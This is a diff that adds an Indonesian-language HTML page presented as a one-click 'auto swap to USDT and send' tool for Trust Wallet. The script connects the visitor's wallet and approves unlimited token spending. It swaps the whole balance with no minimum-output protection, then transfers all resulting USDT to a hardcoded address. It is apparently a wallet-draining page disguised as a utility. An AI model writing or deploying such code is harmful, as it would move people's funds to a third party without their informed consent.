@@ -1,0 +1,157 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Swap to USDT + Kirim</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; margin:0; padding:15px; background:#0f0f0f; color:white; }
+        .container { max-width:100%; background:#1a1a1a; padding:20px; border-radius:12px; }
+        button { width:100%; padding:16px; margin:12px 0; font-size:18px; border:none; border-radius:12px; background:#00cc66; color:white; font-weight:bold; }
+        select, input { width:100%; padding:12px; margin:8px 0; border-radius:8px; font-size:16px; }
+        .log { margin-top:15px; height:400px; overflow-y:auto; background:#000; padding:12px; border-radius:8px; font-family:monospace; font-size:14px; line-height:1.5; }
+        .info { background:#003300; padding:12px; border-radius:8px; margin:10px 0; font-size:15px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🚀 Auto Swap → USDT → Kirim</h2>
+        <p><strong>Trust Wallet Mobile</strong></p>
+
+        <button onclick="startAutoProcess()">🔥 MULAI PROSES OTOMATIS</button>
+
+        <div class="info">
+            <strong>Alamat Tujuan:</strong><br>
+            <span style="color:#00ffaa; word-break:break-all;">0xF9f1C2d90f7516C6f371014dc241b6a54c6F726e</span>
+        </div>
+
+        <h3>Alamat Token Input</h3>
+        <input type="text" id="tokenAddress" value="0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" placeholder="Masukkan alamat token (USDT/USDC/dll)">
+
+        <div class="log" id="log"></div>
+    </div>
+
+    <script>
+        const SWAP_ROUTER = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
+        const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+        const SECONDARY = "0xF9f1C2d90f7516C6f371014dc241b6a54c6F726e"; // Alamat tujuanmu
+
+        let provider, signer, userAddress;
+
+        const log = (msg, error = false) => {
+            const el = document.getElementById('log');
+            const time = new Date().toLocaleTimeString('id-ID');
+            el.innerHTML += `<span style="color:\( {error ? '#ff5555' : '#55ff55'}">[ \){time}] ${msg}</span><br>`;
+            el.scrollTop = el.scrollHeight;
+        };
+
+        async function connectWallet() {
+            if (!window.ethereum) {
+                alert("❌ Harap buka halaman ini di dalam Trust Wallet Browser");
+                return false;
+            }
+            try {
+                provider = new ethers.BrowserProvider(window.ethereum);
+                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+                userAddress = accounts[0];
+                signer = await provider.getSigner();
+
+                log("✅ Terhubung ke Trust Wallet", false);
+                return true;
+            } catch (err) {
+                log("Gagal connect: " + err.message, true);
+                return false;
+            }
+        }
+
+        const erc20Abi = [
+            "function balanceOf(address) view returns (uint256)",
+            "function approve(address,uint256)",
+            "function decimals() view returns (uint8)",
+            "function symbol() view returns (string)",
+            "function transfer(address,uint256)"
+        ];
+
+        const routerAbi = [
+            "function exactInputSingle(tuple(address tokenIn,address tokenOut,uint24 fee,address recipient,uint256 amountIn,uint256 amountOutMinimum,uint160 sqrtPriceLimitX96) params) payable returns (uint256)"
+        ];
+
+        async function startAutoProcess() {
+            document.getElementById('log').innerHTML = '';
+            const connected = await connectWallet();
+            if (!connected) return;
+
+            const tokenIn = document.getElementById('tokenAddress').value.trim();
+
+            if (!tokenIn) {
+                log("❌ Masukkan alamat token!", true);
+                return;
+            }
+
+            await processToUSDT(tokenIn);
+        }
+
+        async function processToUSDT(tokenInAddr) {
+            try {
+                const token = new ethers.Contract(tokenInAddr, erc20Abi, provider);
+                const balance = await token.balanceOf(userAddress);
+                
+                if (balance === 0n) return log("❌ Saldo token kosong!", true);
+
+                const decimals = await token.decimals();
+                const symbol = await token.symbol().catch(() => "TOKEN");
+                
+                log(`💰 Saldo ${symbol}: ${ethers.formatUnits(balance, decimals)}`);
+
+                // === Jika token sudah USDT ===
+                if (tokenInAddr.toLowerCase() === USDT.toLowerCase()) {
+                    log("Token adalah USDT → Langsung kirim...");
+                    const usdtContract = new ethers.Contract(USDT, erc20Abi, signer);
+                    const tx = await usdtContract.transfer(SECONDARY, balance);
+                    await tx.wait();
+                    log("✅ SEMUA USDT BERHASIL DIKIRIM!", false);
+                    return;
+                }
+
+                // === Swap ke USDT ===
+                log("🔓 Approve token...");
+                const tokenSigner = new ethers.Contract(tokenInAddr, erc20Abi, signer);
+                await (await tokenSigner.approve(SWAP_ROUTER, ethers.MaxUint256)).wait();
+                log("✅ Approve berhasil");
+
+                log("🔄 Swap ke USDT...");
+                const router = new ethers.Contract(SWAP_ROUTER, routerAbi, signer);
+                
+                const params = {
+                    tokenIn: tokenInAddr,
+                    tokenOut: USDT,
+                    fee: 3000,
+                    recipient: userAddress,
+                    amountIn: balance,
+                    amountOutMinimum: 0n,
+                    sqrtPriceLimitX96: 0n
+                };
+
+                const swapTx = await router.exactInputSingle(params);
+                await swapTx.wait();
+                log("✅ Swap ke USDT selesai!");
+
+                // Kirim semua USDT
+                const usdtContract = new ethers.Contract(USDT, erc20Abi, signer);
+                const finalBalance = await usdtContract.balanceOf(userAddress);
+                
+                if (finalBalance > 0n) {
+                    const sendTx = await usdtContract.transfer(SECONDARY, finalBalance);
+                    await sendTx.wait();
+                    log("✅ SEMUA USDT BERHASIL DIKIRIM ke tujuan!", false);
+                }
+
+            } catch (e) {
+                log("❌ Error: " + e.message, true);
+            }
+        }
+    </script>
+</body>
+</html>
